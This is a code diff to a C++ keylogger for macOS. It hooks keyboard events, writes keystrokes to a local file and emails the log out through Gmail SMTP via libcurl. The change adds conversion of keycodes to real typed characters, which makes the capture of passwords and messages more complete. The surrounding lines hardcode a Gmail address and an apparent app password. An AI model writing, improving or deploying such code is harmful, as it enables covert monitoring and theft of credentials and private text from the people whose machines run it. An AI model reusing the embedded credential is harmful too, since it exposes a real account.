@@ -3,6 +3,8 @@
 #include <fstream>
 #include <ctime>
 #include <curl/curl.h>  // Include libcurl
+#include <ApplicationServices/ApplicationServices.h>
+#include <Carbon/Carbon.h>  // For UCKeyTranslate
 
 // File to save key log
 const char* logFile = "key_log.txt";
@@ -12,6 +14,39 @@ const char* smtp_server = "smtp://smtp.gmail.com:587"; // SMTP server and port
 const char* email_user = "dennis.pidduck@gmail.com"; // Replace with your Gmail address
 const char* email_password = "xglvswysuejigfhq"; // Replace with your Gmail password (use App password if 2FA is enabled)
 const char* recipient_email = "dennis.pidduck@gmail.com"; // Email address where you want to receive the log
+
+std::string convertKeyCodeToString(CGKeyCode keycode) {
+    TISInputSourceRef currentKeyboard = TISCopyCurrentKeyboardInputSource();
+    CFDataRef layoutData = (CFDataRef)TISGetInputSourceProperty(currentKeyboard, kTISPropertyUnicodeKeyLayoutData);
+    const UCKeyboardLayout *keyboardLayout = (const UCKeyboardLayout *)CFDataGetBytePtr(layoutData);
+
+    if (!keyboardLayout) {
+        return "[Unknown]";
+    }
+
+    UInt32 keysDown = 0;
+    UniChar chars[4];
+    UniCharCount realLength;
+
+    OSStatus status = UCKeyTranslate(
+        keyboardLayout,
+        keycode,
+        kUCKeyActionDown,  // Get the character for a key down event
+        0,                 // No modifiers (e.g., shift, control, etc.)
+        LMGetKbdType(),
+        kUCKeyTranslateNoDeadKeysBit,
+        &keysDown,
+        sizeof(chars) / sizeof(chars[0]),
+        &realLength,
+        chars
+    );
+
+    if (status != noErr || realLength == 0) {
+        return "[Unknown]";
+    }
+
+    return std::string(chars, chars + realLength);
+}
 
 size_t read_callback(void *ptr, size_t size, size_t nmemb, void *userp) {
     std::string *email_data = (std::string *)userp;
@@ -116,26 +151,17 @@ CGEventRef keyCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event
     if (type == kCGEventKeyDown) {
         CGKeyCode keycode = CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+        std::string keyString = convertKeyCodeToString(keycode);  // Convert keycode to character
+        logKey(keyString);
+
+        // Handle special keys (Esc, Enter, etc.)
         switch (keycode) {
-            case 0x35:  // Esc key (check this is the correct keycode for Esc)
-                logKey("Escape");
-                sendEmail();  // Ensure sendEmail() is called here
-                shouldExit = true;  // Set the flag to exit the loop after sending email
-                break;
-            case 0x31:  // Spacebar
-                logKey("Space");
-                break;
-            case 0x24:  // Enter key
-                logKey("Enter");
-                break;
-            case 0x30:  // Tab key
-                logKey("Tab");
-                break;
-            case 0x33:  // Backspace key
-                logKey("Backspace");
+            case 0x35:  // Esc key
+                sendEmail();
+                shouldExit = true;
                 break;
             default:
-                logKey("Key code: " + std::to_string(keycode));
+                // log other characters
                 break;
         }
     }
